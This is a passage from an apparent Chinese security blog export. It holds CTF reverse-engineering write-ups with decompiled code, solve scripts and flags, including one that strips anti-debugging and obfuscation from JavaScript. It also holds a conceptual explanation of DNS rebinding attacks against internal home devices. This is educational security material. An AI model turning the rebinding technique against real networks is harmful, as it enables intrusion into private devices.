&#x27;\\&#x27;&#x27; in rotate[ss[i]]: print(rotate[ss[i]-1], end=&#x27; &#x27;) else: print(rotate[ss[i]+1], end=&#x27; &#x27;)print()sss = &#x27;&#x27;&#x27;B2&#x27; D&#x27; L2&#x27; F&#x27; D2&#x27; B2&#x27; R2&#x27; B F2 R&#x27; D2 B L2&#x27; B&#x27; F L2&#x27; F&#x27; D&#x27; U2 R2B&#x27; D2 F&#x27; L D2 L2 R L2 F2&#x27; D2&#x27; L2 R2&#x27; F&#x27; U2&#x27; D&#x27; U B D2 R2&#x27; D2&#x27;R2&#x27; D2&#x27; L2&#x27; D B2&#x27; F2 U2 B&#x27; D L2&#x27; B&#x27; D2 F B&#x27; L D U2&#x27; L2 B2 DF2 L2&#x27; D2 L2&#x27; U F&#x27; U&#x27; R2&#x27; U2 D2 L2&#x27; U2 B L2 R2 B2&#x27; R D2 B&#x27; R&#x27;&#x27;&#x27;&#x27;ssss = &#x27;&#x27;for i in sss: if i != &#x27; &#x27; and i != &#x27;\\n&#x27;: ssss += iprint(ssss) 这样就可以得到四个魔方的解法，可以使用程序验证，最后再将解法按照题目要求处理就行 xsctf&#123;0a15a3168e6bf08df8178186312b0396&#125; 坑 v4数组的定义种少了一个元素v4[133]，需要动态调试得到这个元素的值 因为是4个魔方一起反着输出，所以第一个魔方的解法应该对应第四行的输出 最后串起来的时候是第一个魔方的解法+第二个魔方的解法...，即第四行+第三行+… easy_xor核心代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax char v4; // al int v5; // eax char v7; // [rsp+33h] [rbp-Dh] char v8; // [rsp+33h] [rbp-Dh] int v9; // [rsp+34h] [rbp-Ch] int i; // [rsp+38h] [rbp-8h] int v11; // [rsp+3Ch] [rbp-4h] _main(); v11 = 0; v9 = 0; puts(&quot;Please input your flag:&quot;); while ( 1 ) &#123; v8 = getchar(); if ( v8 == 10 ) break; v7 = key[v9 % 4] ^ v8; while ( 1 ) &#123; v4 = v7--; if ( v4 &lt;= 0 ) break; v3 = v11++; s[v3] = 1; &#125; v5 = v11++; s[v5] = 0; ++v9; &#125; while ( v11 &lt;= 2559 ) s[v11++] = -1; for ( i = 0; i &lt;= 2559; ++i ) &#123; if ( r[i] != s[i] ) &#123; puts(&quot;Lose lose lose!&quot;); break; &#125; &#125; if ( i == 2560 ) puts(&quot;Win win win!&quot;); system(&quot;pause&quot;); return 0;&#125; 其中数组r是在运行时生成的，因此需要使用动态调试 大概的逻辑是： 接收输入直到回车符 计算每个字符异或的结果 异或的结果是多少，就在数组中添加多少个1，然后添加一个0 对比两个数组的差异 因此解密的逻辑就是 拿到目标数组 遍历数组中1的个数，直到遇到数字0 将以上1的个数循环异或key的元素 转换为字符输出 重复2到4，直到遇到-1 exp.py 1234567891011121314151617s = [...]ch = []key_index = 0key = &#x27;SCNU&#x27;c = 0for i in s: if i == 1: c += 1 elif i == 0: # print(hex(c), end=&#x27;&#x27;) ch.append(chr(c^ord(key[key_index%4]))) key_index += 1 c = 0 else: breakprint(&#x27;&#x27;.join(ch)) flag&#123;Winn3r_n0t_L0s3r_#&#125; eazy_64x123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+8h] [rbp-98h] int v5; // [rsp+Ch] [rbp-94h] int i; // [rsp+10h] [rbp-90h] int v7; // [rsp+14h] [rbp-8Ch] int v8; // [rsp+1Ch] [rbp-84h] char *v9; // [rsp+20h] [rbp-80h] char dest[4]; // [rsp+2Ch] [rbp-74h] BYREF char s[104]; // [rsp+30h] [rbp-70h] BYREF unsigned __int64 v12; // [rsp+98h] [rbp-8h] v12 = __readfsqword(0x28u); memset(s, 0, 0x64uLL); __isoc99_scanf(&amp;unk_222C, s); v7 = strlen(s); if ( v7 == 20 ) &#123; v4 = 0; v5 = 0; while ( v7 / 3 &gt;= v4 ) &#123; memset(dest, 0, sizeof(dest)); memcpy(dest, &amp;s[v5], 3uLL); v9 = encrypt(dest); v8 = strlen(v9); get_trans(v9); for ( i = 0; i &lt; v8; ++i ) &#123; if ( v9[i] != glob[4 * v4 + i] ) &#123; puts(&quot;Oh,no!&quot;); return 0; &#125; &#125; free(v9); ++v4; v5 += 3; &#125; printf(&quot;Good!&quot;); return 0; &#125; else &#123; printf(&quot;sorry!&quot;); return 0; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041_BYTE *__fastcall encrypt(const char *a1)&#123; int v2; // [rsp+10h] [rbp-70h] int v3; // [rsp+14h] [rbp-6Ch] __int64 v4; // [rsp+18h] [rbp-68h] signed __int64 v5; // [rsp+20h] [rbp-60h] _BYTE *v6; // [rsp+28h] [rbp-58h] char v7[72]; // [rsp+30h] [rbp-50h] BYREF unsigned __int64 v8; // [rsp+78h] [rbp-8h] v8 = __readfsqword(0x28u); strcpy(v7, &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;); v5 = strlen(a1); if ( v5 % 3 ) v4 = 4 * (v5 / 3 + 1); else v4 = 4 * (v5 / 3); v6 = malloc(v4 + 1); v6[v4] = 0; v2 = 0; v3 = 0; while ( v2 &lt; v4 - 2 ) &#123; v6[v2] = v7[(unsigned __int8)a1[v3] &gt;&gt; 2]; v6[v2 + 1] = v7[((unsigned __int8)a1[v3 + 1] &gt;&gt; 4) | (16 * a1[v3]) &amp; &#x27;0&#x27;]; v6[v2 + 2] = v7[((unsigned __int8)a1[v3 + 2] &gt;&gt; 6) | (4 * a1[v3 + 1]) &amp; 0x3C]; v6[v2 + 3] = v7[a1[v3 + 2] &amp; 0x3F]; v3 += 3; v2 += 4; &#125; if ( v5 % 3 == 1 ) &#123; v6[v2 - 2] = 61; v6[v2 - 1] = 61; &#125; else if ( v5 % 3 == 2 ) &#123; v6[v2 - 1] = 61; &#125; return v6;&#125; 看到这里觉得是base64，也有可能是换表base64，但是解不出来，接着看 1234567891011121314size_t __fastcall get_trans(const char *a1)&#123; size_t result; // rax int i; // [rsp+1Ch] [rbp-14h] for ( i = 0; ; ++i ) &#123; result = strlen(a1); if ( i &gt;= result ) break; a1[i] ^= 0x68u; &#125; return result;&#125; 在类似base编码之后还加了异或 思路： 异或还原 base64 exp 123456789import base64s = [0x32, 0x05, 0x10, 0x00, 0x32, 0x5B, 0x1B, 0x10, 0x30, 0x5A, 0x1F, 0x1F, 0x0C, 0x05, 0x3E, 0x0E, 0x0B, 0x05, 0x3E, 0x5A, 0x32, 0x3C, 0x21, 0x59, 0x32, 0x30, 0x58, 0x55]ss = &#x27;&#x27;for i in s: ss += chr(i^0x68) print(base64.b64decode(ss)) flag&#123;1_l0ve_reve25e&#125; JSNEWNEW一个html内嵌经过混淆的js代码 1((()=&gt;&#123;function _0x139d2b()&#123;setInterval(()=&gt;&#123;(function()&#123;return![]&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)[&#x27;call&#x27;]())&#125;,0x32)&#125;try&#123;_0x139d2b()&#125;catch(_0x536807)&#123;&#125;&#125;)());function _Y0u(_0x5093c8,_0x291ad5)&#123;return _0x5093c8+_0x291ad5&#125;function _C4n(_0x4277b8)&#123;return _0x4277b8&amp;0xff&#125;function _N3v3r(_0x414184,_0x29df09)&#123;return _C4n(_0x414184^_0x29df09)&#125;function _G37(_0x500f65,_0x1ddb85)&#123;return _C4n(_0x500f65|_0x1ddb85)&#125;function _Th15(_0x1621d6,_0x285fc7)&#123;return _C4n(_0x1621d6&amp;_0x285fc7)&#125;function _H4(_0x2abb65)&#123;return _C4n(~_0x2abb65)&#125;function _H4H4(_0x5b22bc)&#123;return _C4n(_H4H4H4(_H4(_0x5b22bc),_H4H4H4([],0x1)))&#125;function _H4H4H4(_0x431cb1,_0x516603)&#123;return _C4n((_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603)))),_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603))))))&#125;function _H4H4H4H4(_0x1b81b8,_0x11e8ab,_0x2c730f)&#123;return a=_H4H4H4(_0x1b81b8,_0x2c730f),a=_H4H4H4(a,_H4H4(_0x11e8ab)),a=_H4H4H4(a,_H4H4(_0x2c730f)),_C4n(a)&#125;function _G00D(_0x51eb06)&#123;((()=&gt;&#123;function _0x139d2b()&#123;setInterval(()=&gt;&#123;(function()&#123;return![]&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)[&#x27;call&#x27;]())&#125;,0x32)&#125;try&#123;_0x139d2b()&#125;catch(_0x536807)&#123;&#125;&#125;)());var _0x8b9e29=document[&#x27;getElementById&#x27;](&#x27;passwordError&#x27;);_0xcaf3caf3=[],_0xc4f3c4f3=[0x55,0xbf,0x63,0xbc,0x33,0x95,0x31,0x4c,0x89,0x6b,0x49,0x31,0x30,0xdf,0x63,0xe5,0x57,0xd7,0x73,0xa6,0x6e,0xd3,0x63,0xa1,0x92,0x5b,0x72,0xe6,0x8f,0x76,0x4f,0xd0],Hur1k=&#x27;Hur1k&#x27;;if(_0x51eb06[&#x27;length&#x27;]!=0x27)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;错误的&#x27;,![];if(_0x51eb06[&#x27;substr&#x27;](0x0,0x6)!=&#x27;XSCTF&#123;&#x27;)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;错误的&#x27;,![];if(_0x51eb06[0x26]!=&#x27;&#125;&#x27;)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;错误的&#x27;,![];_0x114514=_0x51eb06[&#x27;substr&#x27;](0x6,0x20),_0x51eb06=[];for(var _0x28db6c=0x0;_0x28db6c&lt;_0x114514[&#x27;length&#x27;];_0x28db6c++)&#123;_0x51eb06[&#x27;push&#x27;](_0x114514[&#x27;charCodeAt&#x27;](_0x28db6c))&#125;Math[&#x27;seed&#x27;]=new Date()[&#x27;getTime&#x27;](),Math[&#x27;seededRandom&#x27;]=function(_0x14b0c9,_0x56fb11)&#123;_0x56fb11=_0x56fb11||0x1,_0x14b0c9=_0x14b0c9||0x0,Math[&#x27;seed&#x27;]=(Math[&#x27;seed&#x27;]*0x2455+0xc091)%0x38f40;var _0xee8b23=Math[&#x27;seed&#x27;]/0x38f40;return parseInt(_0x14b0c9+_0xee8b23*(_0x56fb11-_0x14b0c9))&#125;;var _0xe5731c=Math[&#x27;seededRandom&#x27;](0x0,0x100);for(var _0x28db6c=0x0;_0x28db6c&lt;_0x51eb06[&#x27;length&#x27;];_0x28db6c+=0x2)&#123;tmp=_H4H4H4(_0x51eb06[_0x28db6c],_0x28db6c)^_0x28db6c,_0xcaf3caf3[&#x27;push&#x27;](tmp),randNum=Math[&#x27;seededRandom&#x27;](0x0,0x100),Math[&#x27;seed&#x27;]=randNum,tmp=_H4H4H4H4(tmp^_0x51eb06[_0x28db6c+0x1],Hur1k[&#x27;charCodeAt&#x27;]([_0x28db6c/0x2%Hur1k[&#x27;length&#x27;]]),randNum),_0xcaf3caf3[&#x27;push&#x27;](tmp)&#125;((()=&gt;&#123;function _0x139d2b()&#123;setInterval(()=&gt;&#123;(function()&#123;return![]&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)[&#x27;call&#x27;]())&#125;,0x32)&#125;try&#123;_0x139d2b()&#125;catch(_0x536807)&#123;&#125;&#125;)());if(_0xcaf3caf3[&#x27;length&#x27;]!=0x20)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;究极错误的&#x27;,![];for(var _0x28db6c=0x0;_0x28db6c&lt;_0xcaf3caf3[&#x27;length&#x27;];_0x28db6c++)&#123;if(_0xcaf3caf3[_0x28db6c]!=_0xc4f3c4f3[_0x28db6c])return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;错误的&#x27;,![]&#125;return!![]&#125; 首先经过Obfuscator.io Deobfuscator (deobfuscate.io)，初步解混淆再通过JavaScript Deobfuscator (deobfuscate.io)，再解一次然后就解不动了（不排除有其他工具） 解混淆的结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596(() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125;&#125;)();function _H4H4H4(_0x431cb1, _0x516603) &#123; ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255; return ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255 &amp; 255;&#125;function _H4H4H4H4(_0x1b81b8, _0x11e8ab, _0x2c730f) &#123; a = _H4H4H4(_0x1b81b8, _0x2c730f); a = _H4H4H4(a, _H4H4H4(~_0x11e8ab &amp; 255, _H4H4H4([], 1)) &amp; 255); a = _H4H4H4(a, _H4H4H4(~_0x2c730f &amp; 255, _H4H4H4([], 1)) &amp; 255); return a &amp; 255;&#125;function _G00D(_0x51eb06) &#123; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); var _0x8b9e29 = document.getElementById(&quot;passwordError&quot;); _0xcaf3caf3 = []; _0xc4f3c4f3 = [85, 191, 99, 188, 51, 149, 49, 76, 137, 107, 73, 49, 48, 223, 99, 229, 87, 215, 115, 166, 110, 211, 99, 161, 146, 91, 114, 230, 143, 118, 79, 208]; Hur1k = &quot;Hur1k&quot;; if (_0x51eb06.length != 39) &#123; _0x8b9e29.textContent = &quot;错误的&quot;; return false; &#125; if (_0x51eb06.substr(0, 6) != &quot;XSCTF&#123;&quot;) &#123; _0x8b9e29.textContent = &quot;错误的&quot;; return false; &#125; if (_0x51eb06[38] != &quot;&#125;&quot;) &#123; _0x8b9e29.textContent = &quot;错误的&quot;; return false; &#125; _0x114514 = _0x51eb06.substr(6, 32); _0x51eb06 = []; for (var _0x28db6c = 0; _0x28db6c &lt; _0x114514.length; _0x28db6c++) &#123; _0x51eb06.push(_0x114514.charCodeAt(_0x28db6c)); &#125; Math.seed = (new Date).getTime(); Math.seededRandom = function (_0x14b0c9, _0x56fb11) &#123; _0x56fb11 = _0x56fb11 || 1; _0x14b0c9 = _0x14b0c9 || 0; Math.seed = (Math.seed * 9301 + 49297) % 233280; var _0xee8b23 = Math.seed / 233280; return parseInt(_0x14b0c9 + _0xee8b23 * (_0x56fb11 - _0x14b0c9)); &#125;; for (var _0x28db6c = 0; _0x28db6c &lt; _0x51eb06.length; _0x28db6c += 2) &#123; tmp = _H4H4H4(_0x51eb06[_0x28db6c], _0x28db6c) ^ _0x28db6c; _0xcaf3caf3.push(tmp); randNum = Math.seededRandom(0, 256); Math.seed = randNum; tmp = _H4H4H4H4(tmp ^ _0x51eb06[_0x28db6c + 1], Hur1k.charCodeAt([_0x28db6c / 2 % Hur1k.length]), randNum); _0xcaf3caf3.push(tmp); &#125; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); if (_0xcaf3caf3.length != 32) &#123; _0x8b9e29.textContent = &quot;究极错误的&quot;; return false; &#125; for (var _0x28db6c = 0; _0x28db6c &lt; _0xcaf3caf3.length; _0x28db6c++) &#123; if (_0xcaf3caf3[_0x28db6c] != _0xc4f3c4f3[_0x28db6c]) &#123; _0x8b9e29.textContent = &quot;错误的&quot;; return false; &#125; &#125; return true;&#125; 然后就是手动解 从目标数组入手回溯 查看对目标数组操作的函数，尝试逆向 逆向不出来怎么办，把函数复制到控制台，传入简单的参数，然后逐个修改参数，观察函数输出 根据这个方法可以推测出_H4H4H4的实际作用是相加，_H4H4H4H4的实际功能是前两个参数相减，第三个参数是摆设 涉及到随机数的参数大概率没什么用 最后手动解混淆的结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899(() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125;&#125;)();function add(_0x431cb1, _0x516603) &#123; ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255; return ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255 &amp; 255;&#125;function sub(h_a, h_b, h_c) &#123; a = h_a + h_c + (((~h_b &amp; 255) + 1)&amp;255) + (((~h_c &amp; 255) + 1)&amp;255) a = h_a + h_c + 256-h_b + 256-h_c a = 512 + h_a - h_b // a = add(h_a, h_c); // a = add(a, add(~h_b &amp; 255, 1) &amp; 255); // a = add(a, add(~h_c &amp; 255, 1) &amp; 255); return a &amp; 255;&#125;function _G00D(userinput) &#123; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); var pass_err = document.getElementById(&quot;passwordError&quot;); userin = []; target = [85, 191, 99, 188, 51, 149, 49, 76, 137, 107, 73, 49, 48, 223, 99, 229, 87, 215, 115, 166, 110, 211, 99, 161, 146, 91, 114, 230, 143, 118, 79, 208]; Hur1k = &quot;Hur1k&quot;; if (userinput.length != 39) &#123; pass_err.textContent = &quot;错误的&quot;; return false; &#125; if (userinput.substr(0, 6) != &quot;XSCTF&#123;&quot;) &#123; pass_err.textContent = &quot;错误的&quot;; return false; &#125; if (userinput[38] != &quot;&#125;&quot;) &#123; pass_err.textContent = &quot;错误的&quot;; return false; &#125; in_slice = userinput.substr(6, 32); userinput = []; for (var i = 0; i &lt; in_slice.length; i++) &#123; userinput.push(in_slice.charCodeAt(i)); &#125; Math.seed = (new Date).getTime(); Math.seededRandom = function (p_a, p_b) &#123; p_b = p_b || 1; p_a = p_a || 0; Math.seed = (Math.seed * 9301 + 49297) % 233280; var p_seed = Math.seed / 233280; return parseInt(p_a + p_seed * (p_b - p_a)); &#125;; for (var i = 0; i &lt; userinput.length; i += 2) &#123; tmp = add(userinput[i], i) ^ i; userin.push(tmp); randNum = Math.seededRandom(0, 256); Math.seed = randNum; tmp = sub(tmp ^ userinput[i + 1], Hur1k.charCodeAt([i / 2 % Hur1k.length]), randNum); userin.push(tmp); &#125; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); if (userin.length != 32) &#123; pass_err.textContent = &quot;究极错误的&quot;; return false; &#125; for (var i = 0; i &lt; userin.length; i++) &#123; if (userin[i] != target[i]) &#123; pass_err.textContent = &quot;错误的&quot;; return false; &#125; &#125; return true;&#125; exp.py 12345678910Hur1k = &quot;Hur1k&quot;s = [85, 191, 99, 188, 51, 149, 49, 76, 137, 107, 73, 49, 48, 223, 99, 229, 87, 215, 115, 166, 110, 211, 99, 161, 146, 91, 114, 230, 143, 118, 79, 208]charCode = [0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 0, 0]for i in range(30, -1, -2): s[i+1] = ((s[i+1]+ord(Hur1k[charCode[i]]))&amp;255)^s[i] s[i] = (s[i]^i)-ifor i in s: print(chr(i), end=&#x27;&#x27;) UR_R341Ly_900d_47_Obfu_ur_Newn3W 一些解混淆的网站 Obfuscator.io Deobfuscator (deobfuscate.io) JavaScript Deobfuscator (deobfuscate.io) 主页 - DeJs JavaScript Deobfuscator (relative.im) 工具 v_jstools（浏览器插件，需配置） – 网页 js 逆向分析 ( v_jstools )、jshook ( 安卓上用js实现Hook )-CSDN博客 lotery shop核心代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495void __noreturn sub_140017AC0()&#123; char *v0; // rdi __int64 i; // rcx char v2; // [rsp+60h] [rbp+0h] BYREF char v3[80]; // [rsp+68h] [rbp+8h] BYREF char v4[80]; // [rsp+B8h] [rbp+58h] BYREF char v5[96]; // [rsp+108h] [rbp+A8h] BYREF char v6[80]; // [rsp+168h] [rbp+108h] BYREF int v7[20]; // [rsp+1B8h] [rbp+158h] BYREF int v8[20]; // [rsp+208h] [rbp+1A8h] BYREF int v9[20]; // [rsp+258h] [rbp+1F8h] BYREF int v10[20]; // [rsp+2A8h] [rbp+248h] BYREF char v11[76]; // [rsp+2F8h] [rbp+298h] BYREF int v12[8]; // [rsp+344h] [rbp+2E4h] BYREF int v13[19]; // [rsp+364h] [rbp+304h] BYREF char v14[180]; // [rsp+3B0h] [rbp+350h] BYREF int v15[148]; // [rsp+464h] [rbp+404h] BYREF int v16; // [rsp+6B4h] [rbp+654h] v0 = &amp;v2; for ( i = 266i64; i; --i ) &#123; *(_DWORD *)v0 = -858993460; v0 += 4; &#125; sub_140011690(&amp;unk_14002D06A); v13[0] = 0; v13[8] = 10; j_memset(v14, 0, 30ui64); v15[0] = 0; sub_14001117C(v3, &quot;Sloth&#x27;s lottery shop is open!&quot;); sub_14001117C(v4, &quot;You&#x27;re our first customer!&quot;); sub_1400114CE(v5, &quot;We will give you a free lottery ticket, the number is: &quot;); sub_14001117C(v6, &quot;Please enter your choice &#123;1-5&#125;&quot;); sub_14001117C(v7, &quot;1.buy a lottery ticket&quot;); sub_14001117C(v8, &quot;2.Check to see if you won&quot;); sub_14001117C(v9, &quot;3.join us&quot;); sub_14001117C(v10, &quot;4.Take a sneak peek at the flag&quot;); sub_14001117C(v11, &quot;5.exit&quot;); sub_1400110FF( (int)v3, (int)v4, (int)v5, (int)v6, (__int64)v7, (__int64)v8, (__int64)v9, (__int64)v10, (__int64)v11, (__int64)v13, (__int64)v15, (__int64)v14); while ( 1 ) &#123; while ( 1 ) &#123; sub_14001156E((int)v7, (int)v8, (int)v9, (int)v10, v11, v6); sub_1400113CA(&quot;%d&quot;, v12); v16 = v12[0]; if ( v12[0] != 1 ) break; system(&quot;cls&quot;); sub_1400111EF(v15, (__int64)v14); sub_1400111BD(); &#125; switch ( v16 ) &#123; case 2: system(&quot;cls&quot;); sub_140011708(v15, v14, (unsigned int)v13[0]); sub_1400111BD(); break; case 3: system(&quot;cls&quot;); sub_14001149C(); sub_1400111BD(); break; case 4: system(&quot;cls&quot;); sub_1400114E7(); sub_1400111BD(); break; case 5: system(&quot;cls&quot;); puts(&quot;Welcome again&quot;); sub_1400111BD(); exit(1); default: puts(&quot;input error&quot;); sub_1400111BD(); break; &#125; &#125;&#125; 这里并没有有关flag的信息，真正的flag在sub_1400110FF函数中 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576__int64 __fastcall sub_140016760( __int64 a1, __int64 a2, __int64 a3, __int64 a4, _BYTE *a5, __int64 a6, __int64 a7, __int64 a8, _BYTE *a9, _DWORD *a10, int *a11, __int64 a12)&#123; unsigned int v12; // eax _BYTE *v14; // [rsp+1E8h] [rbp+1C8h] int v15; // [rsp+264h] [rbp+244h] int v16; // [rsp+264h] [rbp+244h] int i; // [rsp+284h] [rbp+264h] int v18; // [rsp+2A4h] [rbp+284h] int j; // [rsp+2C4h] [rbp+2A4h] __int64 v20; // [rsp+2E8h] [rbp+2C8h] sub_140011690(&amp;unk_14002D06A); v14 = (_BYTE *)sub_1400112AD(14i64); puts((const char *)a1); puts((const char *)a2); v14[9] = *a5; v14[2] = v14[9]; v14[1] = *(_BYTE *)(a1 + 10) - 12; v14[10] = *(_BYTE *)(a3 + 5) - 56; v14[7] = *(_BYTE *)(a6 + 15) - 10; v14[13] = toupper((char)(*(_BYTE *)(a8 + 3) + 3)); v14[3] = *(_BYTE *)(a2 + 1) + 4; v14[11] = toupper((char)(*(_BYTE *)(a7 + 7) - 14)); v14[4] = v14[7]; *v14 = tolower((char)(*a9 + 31)); v14[8] = toupper(*(char *)(a8 + 27)); v14[5] = toupper((char)(*(_BYTE *)(a4 + 13) - 16)); v14[6] = v14[3]; v14[12] = a5[6] - 39; v12 = sub_1400180A0(0i64); srand(v12); v15 = 1; for ( i = 0; i &lt; 8; ++i ) &#123; v18 = rand() % 10; if ( i != 7 || v18 ) &#123; *a10 += v18 * v15; v15 *= 10; &#125; else &#123; --i; &#125; &#125; v16 = 1; for ( j = 0; j &lt; 8; ++j ) &#123; v20 = rand() % 10; if ( j != 7 || v20 ) &#123; if ( j ) *(_QWORD *)(a12 + 8i64 * *a11) += v20 * v16; else *(_QWORD *)(a12 + 8i64 * *a11) = v20; v16 *= 10; &#125; else &#123; --j; &#125; &#125; return sub_1400112E9(&quot;%s %d\\n&quot;, (const char *)a3, *(_QWORD *)(a12 + 8i64 * (*a11)++));&#125; 真正的flag在v14变量中，是根据已有的变量变换得到的 exp 12345678910111213141516171819202122232425262728293031v3 = &quot;Sloth&#x27;s lottery shop is open!&quot;v4 = &quot;You&#x27;re our first customer!&quot;v5 = &quot;We will give you a free lottery ticket, the number is: &quot;v6 = &quot;Please enter your choice &#123;1-5&#125;&quot;v7 = &quot;1.buy a lottery ticket&quot;v8 = &quot;2.Check to see if you won&quot;v9 = &quot;3.join us&quot;v10 = &quot;4.Take a sneak peek at the flag&quot;v11 = &quot;5.exit&quot;v13 = [0, 0, 0, 0, 0, 0, 0, 0, 10]v15 = [0] * 10v14 = [0] * 10V14 = [0] * 14V14[9] = v7[0]V14[2] = V14[9]V14[1] = chr(ord(v3[10])-12)V14[10] = chr(ord(v5[5]) - 56)V14[7] = chr(ord(v8[15]) - 10)V14[13] = chr(ord(v10[3]) + 3).upper()#V14[3] = chr(ord(v4[1]) + 4)V14[11] = chr(ord(v9[7])-14).upper()#V14[4] = (V14[7])V14[0] = chr(ord(v11[0])+31).lower()#lV14[8] = (v10[27]).upper()#V14[5] = chr(ord(v6[13])-16).upper()#V14[6] = V14[3]V14[12] = chr(ord(v7[6])-39)print(&#x27;&#x27;.join(V14)) XSCTF&#123;th1s_Is_F14G:D&#125;","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"DNS重绑定","slug":"dns_rebinding_attack","date":"2022-04-17T09:09:58.753Z","updated":"2024-11-09T19:24:12.633Z","comments":true,"path":"2022/04/17/dns_rebinding_attack/","link":"","permalink":"http://uniqueland.top/2022/04/17/dns_rebinding_attack/","excerpt":"","text":"DNS重绑定DNS重绑定指的是在用户访问域名时更改域名指向的IP从而令用户访问指定IP的攻击手法 DNS：由于网络传输需要IP地址，故需要DNS（Domian Name Server）用于查询给定域名指向的IP 同源策略（The Same-origin Policy）： The same-origin policy restricts which network messages one origin can send to another. For example, the same-origin policy allows inter-origin HTTP requests with GET and POST methods but denies inter-origin PUT and DELETE requests. Additionally, origins can use custom HTTP headers when sending requests to themselves but cannot use custom headers when sending requests to other origins. The restrictions on reading information received from other origins is also somewhat subtle. For example, the HTML &lt;script&gt; element can execute content retrieved from foreign origins, which means web sites should not rely on the same-origin policy to protect the confidentiality of information in a format that happens to parse as script (e.g., JavaScript source files, JSON format, JSONP services, or JavaScript/gif polyglots). For all such resources, no loss of security would result (and much flexibility would be gained) from adding the Access-Control-Allow-Origin:* header to all responses. 以上解释来自于Same Origin Policy - Web Security (w3.org) 简单来说，为了防止淘宝网带着你的账户信息访问京东，需要同源策略来限制不同网站之间的访问规范 ​ 可以看出同源的要求是“协议+端口+域名/ip”，而如果以域名访问网站（通常的做法）时同源策略就变成了“协议+端口+域名”这就给了DNS重绑定攻击实现的可能 要实现DNS重绑定攻击，攻击者需要具备以下条件： 诱使用户点击给定链接（钓鱼邮件、钓鱼短信、社工等） 可控的DNS服务器（自己搭建一个或者抢一个） ​ DNS重绑定攻击会诱使用户访问一个域名，在用户第一次访问时以正常的IP进行通信，并且在返回的DNS查询结果中将TTL设置为1或其他比较小的数字，在诱使用户以点击等行为构造好恶意请求时，攻击者一般会修改DNS服务器上该域名指向的IP，从而将恶意请求发送至攻击者指定的IP； TTL（Time To Live）指的是dns查询结果的有效时间，通过修改TTL为一个较小的值从而实现受害者与DNS服务器的频繁通信，从而保证在修改域名指向的IP时能立即生效 ​ 易受攻击的设备：一般是位于内网的智能家居设备，由于攻击者无法从外网访问受害者的内网，故以此种攻击伪造身份访问内网（SSRF）；比如恒温器，若在一个只有老人的场所中，这种攻击往往是致命的 quoteSame Origin Policy - Web Security (w3.org)利用DNS重绑定攻击专用网络 - 知乎 (zhihu.com)从0到1认识DNS重绑定攻击 - 先知社区 (aliyun.com)","categories":[],"tags":[{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"}]},{"title":"GoogleHacking","slug":"google_hacking","date":"2022-04-09T09:12:54.823Z","updated":"2024-11-09T19:29:59.383Z","comments":true,"path":"2022/04/09/google_hacking/","link":"","permalink":"http://uniqueland.top/2022/04/09/google_hacking/","excerpt":"","text":"Google HackingGoogle hacking是一系列用于高效运用搜索引擎的技巧，也可以用于测试漏洞等用处 A and B 